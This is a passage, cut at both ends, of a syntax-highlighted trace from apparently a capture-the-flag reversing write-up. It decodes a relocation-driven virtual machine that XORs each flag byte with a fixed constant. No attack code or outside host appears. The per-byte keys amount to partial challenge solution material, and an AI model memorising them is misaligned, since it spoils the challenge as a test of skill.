class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0027</span>] :: mov s2, &amp;flag[<span class="number">1</span>]</span><br><span class="line">[<span class="number">0028</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0029</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0030</span>] :: mov arr[<span class="number">78</span>], &amp;<span class="number">1657465678663595136</span></span><br><span class="line">[<span class="number">0031</span>] :: mov arr[<span class="number">79</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0032</span>] :: mov s3, &amp;arr[<span class="number">78</span>]</span><br><span class="line">[<span class="number">0033</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0034</span>] :: add arr[<span class="number">78</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0035</span>] :: mov s2, &amp;r101002.r_address</span><br><span class="line">[<span class="number">0037</span>] :: <span class="built_in">mov</span>(<span class="number">24</span>) arr[<span class="number">78</span>], s2</span><br><span class="line">[<span class="number">0038</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0039</span>] :: mov arr[<span class="number">105</span>], &amp;<span class="number">72198609829168256</span></span><br><span class="line">[<span class="number">0040</span>] :: mov arr[<span class="number">106</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0041</span>] :: mov s3, &amp;arr[<span class="number">105</span>]</span><br><span class="line">[<span class="number">0042</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0043</span>] :: add arr[<span class="number">105</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0044</span>] :: mov arr[<span class="number">105</span>], s2</span><br><span class="line">[<span class="number">0045</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0047</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0048</span>] :: mov s2, &amp;flag[<span class="number">2</span>]</span><br><span class="line">[<span class="number">0049</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0050</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0051</span>] :: mov arr[<span class="number">141</span>], &amp;<span class="number">1153062520398099584</span></span><br><span class="line">[<span class="number">0052</span>] :: mov arr[<span class="number">142</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0053</span>] :: mov s3, &amp;arr[<span class="number">141</span>]</span><br><span class="line">[<span class="number">0054</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0055</span>] :: add arr[<span class="number">141</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0056</span>] :: mov s2, &amp;r101002.r_address</span><br><span class="line">[<span class="number">0058</span>] :: <span class="built_in">mov</span>(<span class="number">24</span>) arr[<span class="number">141</span>], s2</span><br><span class="line">[<span class="number">0059</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0060</span>] :: mov arr[<span class="number">168</span>], &amp;<span class="number">144256203867096192</span></span><br><span class="line">[<span class="number">0061</span>] :: mov arr[<span class="number">169</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0062</span>] :: mov s3, &amp;arr[<span class="number">168</span>]</span><br><span class="line">[<span class="number">0063</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0064</span>] :: add arr[<span class="number">168</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0065</span>] :: mov arr[<span class="number">168</span>], s2</span><br><span class="line">[<span class="number">0066</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0068</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0069</span>] :: mov s2, &amp;flag[<span class="number">3</span>]</span><br><span class="line">[<span class="number">0070</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0071</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0072</span>] :: mov arr[<span class="number">204</span>], &amp;<span class="number">1297177708473955456</span></span><br><span class="line">[<span class="number">0073</span>] :: mov arr[<span class="number">205</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0074</span>] :: mov s3, &amp;arr[<span class="number">204</span>]</span><br><span class="line">[<span class="number">0075</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0076</span>] :: add arr[<span class="number">204</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0077</span>] :: mov s2, &amp;r101002.r_address</span><br><span class="line">[<span class="number">0079</span>] :: <span class="built_in">mov</span>(<span class="number">24</span>) arr[<span class="number">204</span>], s2</span><br><span class="line">[<span class="number">0080</span>] :: [ARRAY SLOT]</span><br><span class="line">[<span class="number">0081</span>] :: mov arr[<span class="number">231</span>], &amp;<span class="number">216313797905024128</span></span><br><span class="line">[<span class="number">0082</span>] :: mov arr[<span class="number">232</span>], &amp;<span class="number">195</span></span><br><span class="line">[<span class="number">0083</span>] :: mov s3, &amp;arr[<span class="number">231</span>]</span><br><span class="line">[<span class="number">0084</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0085</span>] :: add arr[<span class="number">231</span>], s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0086</span>] :: mov arr[<span class="number">231</span>], s2</span><br><span class="line">[<span class="number">0087</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0089</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0090</span>] :: mov s2, &amp;flag[<span class="number">4</span>]</span><br><span class="line">[<span class="number">0091</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0092</span>] :: exec r92.r_address &lt;- <span class="number">803425</span>cc40800010c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x10</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0101</span>] :: array [<span class="number">0x4008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0104</span>] :: mov s3, &amp;r101.r_address</span><br><span class="line">[<span class="number">0105</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0106</span>] :: add r101.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0107</span>] :: mov r101.r_address, s2</span><br><span class="line">[<span class="number">0108</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0110</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0111</span>] :: mov s2, &amp;flag[<span class="number">5</span>]</span><br><span class="line">[<span class="number">0112</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0113</span>] :: exec r113.r_address &lt;- <span class="number">803425</span>cc40800011c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x11</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0122</span>] :: array [<span class="number">0x5008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0125</span>] :: mov s3, &amp;r122.r_address</span><br><span class="line">[<span class="number">0126</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0127</span>] :: add r122.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0128</span>] :: mov r122.r_address, s2</span><br><span class="line">[<span class="number">0129</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0131</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0132</span>] :: mov s2, &amp;flag[<span class="number">6</span>]</span><br><span class="line">[<span class="number">0133</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0134</span>] :: exec r134.r_address &lt;- <span class="number">803425</span>cc40800012c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x12</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0143</span>] :: array [<span class="number">0x6008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0146</span>] :: mov s3, &amp;r143.r_address</span><br><span class="line">[<span class="number">0147</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0148</span>] :: add r143.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0149</span>] :: mov r143.r_address, s2</span><br><span class="line">[<span class="number">0150</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0152</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0153</span>] :: mov s2, &amp;flag[<span class="number">7</span>]</span><br><span class="line">[<span class="number">0154</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0155</span>] :: exec r155.r_address &lt;- <span class="number">803425</span>cc40800013c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x13</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0164</span>] :: array [<span class="number">0x7008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0167</span>] :: mov s3, &amp;r164.r_address</span><br><span class="line">[<span class="number">0168</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0169</span>] :: add r164.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0170</span>] :: mov r164.r_address, s2</span><br><span class="line">[<span class="number">0171</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0173</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">0</span>], s2</span><br><span class="line">[<span class="number">0174</span>] :: mov s2, &amp;flag[<span class="number">8</span>]</span><br><span class="line">[<span class="number">0175</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0176</span>] :: exec r176.r_address &lt;- <span class="number">803425</span>cc40800014c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x14</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0185</span>] :: array [<span class="number">0x8008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0188</span>] :: mov s3, &amp;r185.r_address</span><br><span class="line">[<span class="number">0189</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0190</span>] :: add r185.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0191</span>] :: mov r185.r_address, s2</span><br><span class="line">[<span class="number">0192</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0194</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0195</span>] :: mov s2, &amp;flag[<span class="number">9</span>]</span><br><span class="line">[<span class="number">0196</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0197</span>] :: exec r197.r_address &lt;- <span class="number">803425</span>cc40800015c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x15</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0206</span>] :: array [<span class="number">0x9008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0209</span>] :: mov s3, &amp;r206.r_address</span><br><span class="line">[<span class="number">0210</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0211</span>] :: add r206.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0212</span>] :: mov r206.r_address, s2</span><br><span class="line">[<span class="number">0213</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0215</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0216</span>] :: mov s2, &amp;flag[<span class="number">10</span>]</span><br><span class="line">[<span class="number">0217</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0218</span>] :: exec r218.r_address &lt;- <span class="number">803425</span>cc40800016c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x16</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0227</span>] :: array [<span class="number">0xa008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0230</span>] :: mov s3, &amp;r227.r_address</span><br><span class="line">[<span class="number">0231</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0232</span>] :: add r227.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0233</span>] :: mov r227.r_address, s2</span><br><span class="line">[<span class="number">0234</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0236</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0237</span>] :: mov s2, &amp;flag[<span class="number">11</span>]</span><br><span class="line">[<span class="number">0238</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0239</span>] :: exec r239.r_address &lt;- <span class="number">803425</span>cc40800017c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x17</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0248</span>] :: array [<span class="number">0xb008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0251</span>] :: mov s3, &amp;r248.r_address</span><br><span class="line">[<span class="number">0252</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0253</span>] :: add r248.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0254</span>] :: mov r248.r_address, s2</span><br><span class="line">[<span class="number">0255</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0257</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0258</span>] :: mov s2, &amp;flag[<span class="number">12</span>]</span><br><span class="line">[<span class="number">0259</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0260</span>] :: exec r260.r_address &lt;- <span class="number">803425</span>cc40800018c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x18</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0269</span>] :: array [<span class="number">0xc008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0272</span>] :: mov s3, &amp;r269.r_address</span><br><span class="line">[<span class="number">0273</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0274</span>] :: add r269.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0275</span>] :: mov r269.r_address, s2</span><br><span class="line">[<span class="number">0276</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0278</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0279</span>] :: mov s2, &amp;flag[<span class="number">13</span>]</span><br><span class="line">[<span class="number">0280</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0281</span>] :: exec r281.r_address &lt;- <span class="number">803425</span>cc40800019c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x19</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0290</span>] :: array [<span class="number">0xd008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0293</span>] :: mov s3, &amp;r290.r_address</span><br><span class="line">[<span class="number">0294</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0295</span>] :: add r290.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0296</span>] :: mov r290.r_address, s2</span><br><span class="line">[<span class="number">0297</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0299</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0300</span>] :: mov s2, &amp;flag[<span class="number">14</span>]</span><br><span class="line">[<span class="number">0301</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0302</span>] :: exec r302.r_address &lt;- <span class="number">803425</span>cc40800024c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x24</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0311</span>] :: array [<span class="number">0xe008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0314</span>] :: mov s3, &amp;r311.r_address</span><br><span class="line">[<span class="number">0315</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0316</span>] :: add r311.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0317</span>] :: mov r311.r_address, s2</span><br><span class="line">[<span class="number">0318</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0320</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0321</span>] :: mov s2, &amp;flag[<span class="number">15</span>]</span><br><span class="line">[<span class="number">0322</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0323</span>] :: exec r323.r_address &lt;- <span class="number">803425</span>cc4080002cc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x2c</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0332</span>] :: array [<span class="number">0xf008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0335</span>] :: mov s3, &amp;r332.r_address</span><br><span class="line">[<span class="number">0336</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0337</span>] :: add r332.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0338</span>] :: mov r332.r_address, s2</span><br><span class="line">[<span class="number">0339</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0341</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">1</span>], s2</span><br><span class="line">[<span class="number">0342</span>] :: mov s2, &amp;flag[<span class="number">16</span>]</span><br><span class="line">[<span class="number">0343</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0344</span>] :: exec r344.r_address &lt;- <span class="number">803425</span>cc40800026c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x26</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0353</span>] :: array [<span class="number">0x10008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0356</span>] :: mov s3, &amp;r353.r_address</span><br><span class="line">[<span class="number">0357</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0358</span>] :: add r353.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0359</span>] :: mov r353.r_address, s2</span><br><span class="line">[<span class="number">0360</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0362</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0363</span>] :: mov s2, &amp;flag[<span class="number">17</span>]</span><br><span class="line">[<span class="number">0364</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0365</span>] :: exec r365.r_address &lt;- <span class="number">803425</span>cc4080001ec3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x1e</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0374</span>] :: array [<span class="number">0x11008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0377</span>] :: mov s3, &amp;r374.r_address</span><br><span class="line">[<span class="number">0378</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0379</span>] :: add r374.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0380</span>] :: mov r374.r_address, s2</span><br><span class="line">[<span class="number">0381</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0383</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0384</span>] :: mov s2, &amp;flag[<span class="number">18</span>]</span><br><span class="line">[<span class="number">0385</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0386</span>] :: exec r386.r_address &lt;- <span class="number">803425</span>cc4080001fc3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x1f</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0395</span>] :: array [<span class="number">0x12008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0398</span>] :: mov s3, &amp;r395.r_address</span><br><span class="line">[<span class="number">0399</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0400</span>] :: add r395.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0401</span>] :: mov r395.r_address, s2</span><br><span class="line">[<span class="number">0402</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0404</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0405</span>] :: mov s2, &amp;flag[<span class="number">19</span>]</span><br><span class="line">[<span class="number">0406</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0407</span>] :: exec r407.r_address &lt;- <span class="number">803425</span>cc40800020c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x20</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0416</span>] :: array [<span class="number">0x13008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0419</span>] :: mov s3, &amp;r416.r_address</span><br><span class="line">[<span class="number">0420</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0421</span>] :: add r416.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0422</span>] :: mov r416.r_address, s2</span><br><span class="line">[<span class="number">0423</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0425</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0426</span>] :: mov s2, &amp;flag[<span class="number">20</span>]</span><br><span class="line">[<span class="number">0427</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0428</span>] :: exec r428.r_address &lt;- <span class="number">803425</span>cc40800020c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x20</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0437</span>] :: array [<span class="number">0x14008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0440</span>] :: mov s3, &amp;r437.r_address</span><br><span class="line">[<span class="number">0441</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0442</span>] :: add r437.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0443</span>] :: mov r437.r_address, s2</span><br><span class="line">[<span class="number">0444</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0446</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0447</span>] :: mov s2, &amp;flag[<span class="number">21</span>]</span><br><span class="line">[<span class="number">0448</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0449</span>] :: exec r449.r_address &lt;- <span class="number">803425</span>cc40800021c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x21</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0458</span>] :: array [<span class="number">0x15008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0461</span>] :: mov s3, &amp;r458.r_address</span><br><span class="line">[<span class="number">0462</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0463</span>] :: add r458.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0464</span>] :: mov r458.r_address, s2</span><br><span class="line">[<span class="number">0465</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0467</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0468</span>] :: mov s2, &amp;flag[<span class="number">22</span>]</span><br><span class="line">[<span class="number">0469</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0470</span>] :: exec r470.r_address &lt;- <span class="number">803425</span>cc40800023c3000000000000000000000000000000</span><br><span class="line">--------------------</span><br><span class="line">    <span class="number">0x0</span>:<span class="keyword">xor</span>byte ptr [s4], <span class="number">0x23</span></span><br><span class="line">--------------------</span><br><span class="line">[<span class="number">0479</span>] :: array [<span class="number">0x16008040cc250480</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>]</span><br><span class="line">[<span class="number">0482</span>] :: mov s3, &amp;r479.r_address</span><br><span class="line">[<span class="number">0483</span>] :: setinfo s3, name=<span class="number">0x1a</span>, info=<span class="number">0x1</span>, other=<span class="number">0x0</span>, shndx=<span class="number">0x0</span></span><br><span class="line">[<span class="number">0484</span>] :: add r479.r_address, s3, <span class="number">0</span></span><br><span class="line">[<span class="number">0485</span>] :: mov r479.r_address, s2</span><br><span class="line">[<span class="number">0486</span>] :: mov s2, &amp;s4</span><br><span class="line">[<span class="number">0488</span>] :: <span class="built_in">mov</span>(<span class="number">1</span>) arr[<span class="number">2</span>], s2</span><br><span class="line">[<span class="number">0489</span>] :: mov s2, &amp;flag[<span class="number">23</span>]</span><br><span class="line">[<span class="number">0490</span>] :: mov s4, s2</span><br><span class="line">[<span class="number">0491</span>] :: exec r491.r_address &lt;- <span 